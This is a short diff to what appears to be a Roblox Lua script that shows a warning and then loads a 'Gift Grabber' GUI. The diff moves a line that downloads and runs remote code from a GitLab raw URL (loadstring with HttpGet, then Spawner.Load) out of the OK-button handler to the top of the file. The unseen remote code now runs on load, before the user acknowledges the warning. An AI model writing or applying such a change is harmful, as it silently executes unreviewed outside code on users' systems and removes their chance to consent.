@@ -1,3 +1,6 @@
+local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+Spawner.Load()
+
 --// Services
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
@@ -56,6 +59,3 @@ Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)
 --// When OK clicked, destroy warning & load Gift Grabber GUI
 okBtn.MouseButton1Click:Connect(function()
     screenGui:Destroy()
-
-local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
-Spawner.Load()
